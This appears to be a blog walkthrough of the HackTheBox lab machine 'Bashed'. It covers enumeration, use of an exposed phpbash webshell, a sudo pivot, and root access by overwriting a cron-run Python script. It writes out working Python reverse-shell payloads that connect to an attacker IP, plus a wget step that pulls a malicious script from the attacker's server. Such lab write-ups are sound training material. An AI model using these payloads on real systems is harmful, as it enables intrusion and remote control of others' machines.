---
layout: post
title: HTB Bashed 
subtitle:
featured-img: 
thumbnail: https://labs.hackthebox.com/storage/avatars/0f058b73659ca043de9f5240abd651ca.png
date: 2023-10-27
author: lowercasenumbers
category: [HackTheBox]
tags: [ctf,OS Command Injection,sudo]
---

Bashed from Hackthebox, is a fairly easy machine without too many rabbit holes. Exploitation involves performing good enumeration, not overlooking the quick wins, a bit of curiosity. Overall its a good box for and serves as a good reminder not to over complicate it. 

![bashed](/assets/img/blog/htb/bashed/bashed.png)

# Enumeration

Initial enumeration of the machine was done with: `nmap -sC -sV -oN nmap 10.129.74.120`
```bash
-sC for default scripts
-sV for service version enumeration
-p- for all port s
-oN to save the output to a file
```

Following a scan of all TCP ports, the results below show only port 80 is open which simplifies what to look at next.
```
# Nmap 7.94 scan initiated Mon Oct 23 08:56:12 2023 as: nmap -sC -sV -p- -oN nmap 10.129.74.120
Nmap scan report for 10.129.74.120
Host is up (0.024s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 23 08:56:25 2023 -- 1 IP address (1 host up) scanned in 12.96 seconds
```
In order to multitask, we start another scan with `gobuster` to try to identify any subdirectories. We will use the arguments `dir, --url, --wordlist, --o`
```bash
dir specifies gobuster should use directory/file enumberation mode
--url specifies the url
--wordlist specifies which list  of words to use. I like directory-list-2.3-medium.txt as it is a good mix of words without taking too long most of the time
-o to save the output to a file
```

```bash
gobuster dir --url http://10.129.74.120 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.74.120
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.129.76.202/images/]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.76.202/uploads/]
/php                  (Status: 301) [Size: 312] [--> http://10.129.76.202/php/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.76.202/css/]
/dev                  (Status: 301) [Size: 312] [--> http://10.129.76.202/dev/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.76.202/js/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.76.202/fonts/]
/server-status        (Status: 403) [Size: 301]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================

```

While the scan is running its always a good idea to take a look at the webpage in a browser and check the source code. Sometimes this provides a piece of important information. I like to do this while something else is running in order to save a little time. The homepage indicates that phpbash was used on this server. Investigating this further shows that php bash is a webshell that can be used to execute system commands

![phpbash homepage](/assets/img/blog/htb/bashed/phpbash.png)

Reviewing the directories discovered by gobuster, we find we are able to list the files of the directory and within it, there are 2 files which appear to be the webshell:
```bashR
phpbash.php
phpbash.min.php
```

# Initial Access
Using a browser to navigate to either of these files provides us with a webshell as the user www-data. With webshells, its generally more useful to upgrade to a reverse shell. So we can do that next. To do this we must first start a netcat listener on our host and then initiate a the reverse shell from the webshell. 
```bash
# On our host we setup the listener
nc -nlvp 4444

# In the Web Shell 
export RHOST="10.10.14.83";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

As a result we catch the bash shell. 
```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.83] from (UNKNOWN) [10.129.74.120] 44840
www-data@bashed:/var/www/html/dev$ whoami
whoami
www-data
www-data@bashed:/var/www/html/dev$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@bashed:/var/www/html/dev$ 
```
Navigating around the box we find two users in the /home directory; arrexel and scriptmanager. As it happens the user www-data has read access in the users arrexel's home direcotry. This is where we find the user flag.
```
www-data@bashed:/home/arrexel$ ls -la user.txt
ls -la user.txt
-r--r--r-- 1 arrexel arrexel 33 Oct 27 06:20 user.txt
```

# Privliege Escalation
While multiple tools exist to automate the enumeration for linux privilege escalation. Its generally a good idea to look for some quick wins. 99% of the time, I like to start with checking if the current user can run any commands as root, specifically it would be helpful if any commands can be run with NOPASSWD. We can check this with `sudo -l`
The results below show we cant run any commands as root, but we can run any command as scriptmanager. This gives us a little more access, we can pivot to this user and continue enumerating. 
```bash
www-data@bashed:/home/arrexel$ sudo -l
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```
 The ability to run any command as another user, also means we can  start a shell as that user. This has the added advantage of maintaining the permission for any additional commands. 
```bash
www-data@bashed:/home/arrexel$ sudo -u scriptmanager /bin/bash
sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/home/arrexel$ whoami
whoami
scriptmanager
scriptmanager@bashed:/home/arrexel$ 
```
Enumerating as the scriptmanager user, we identify an odd directory in the `/` directory. The scripts directory is not normal which is a slight hint that we should look at it. Had we performed other enumeration as the www-data user we would have seen this directory but not been able to access it. Listing the contents of this directory with `ls -la` we see two files, `test.py` and `test.txt`. It is important to notice that is happening here, `test.py` is a python script that is owned by our current user `scriptmanager`. However, the test.txt file is owned by `root`. Another observation is the `test.txt` file is last modified a minute ago. If we `cat` this file we see the output `testing 123!`. Looking at the test.py file we can see the python script runs and creates the file `test.txt`. Since we know the `test.txt` file is owned by root we can conclude that root is executing the `test.py` script every minute. Since `scriptmanager` owns this file we can modify it and run commands as `root`.
```bash
scriptmanager@bashed:/scripts$ ls -la
ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Oct 27 07:25 test.txt

scriptmanager@bashed:/scripts$ cat test.txt
cat test.txt
testing 123!scriptmanager@bashed:/scripts$
```

One way to replace the contents of the file is to create a local file with the commands we want to execute and then use wget to get this from our local machine. Although we could just read the contents of the root.txt file, its better to get a root shell. To do this, we create a `test.py` file locally with the as shown below. This will use python to create a reverse shell to us on port 5555. 
```python
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.83",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
```

For this to execute we can transfer the file by creating a local web server on port 80
```python
python -m http.server 80
```
Then from our reverse shell we can use `wget` to retrieve it and replace the `test.py` with our malicious file. Since the script seems to be running every minute we can also set up our netcat listener on port 5555 so we catch the shell. 

```
# On our local machine we setup the netcat listener
nc -nlvp 5555

# We need to move the test.py file to a backup before copying over the new malicious file
mv test.py test.py.bak

# On the bashed system we copy the test.py file over using wget
wget http://10.10.14.83/test.py 
```
After waiting a few moments we receive the connection as root.
```bash
listening on [any] 5555 ...
connect to [10.10.14.83] from (UNKNOWN) [10.129.74.120] 53576
# whoami
whoami
root
# ls -la /root
ls -la /root
total 28
drwx------  3 root root 4096 Oct 27 06:20 .
drwxr-xr-x 23 root root 4096 Jun  2  2022 ..
lrwxrwxrwx  1 root root    9 Jun  2  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root 3121 Dec  4  2017 .bashrc
drwxr-xr-x  2 root root 4096 Jun  2  2022 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   33 Oct 27 06:20 root.txt
-rw-r--r--  1 root root   66 Dec  4  2017 .selected_editor
```
# Other Observations
In an effort to understand what is really happening, we can take a look at cron jobs that run as the root user. Running `crontab -l` will show us a bash script that runs every minute is configured. What I found interesting is that the script will change directories to `/scritps` then execute every file ending in .py. This was unknown but we could have named the file anything we wanted, as long as it ended in `.py`. 
```bash
crontab -l
crontab -l
* * * * * cd /scripts; for f in *.py; do python "$f"; done
```
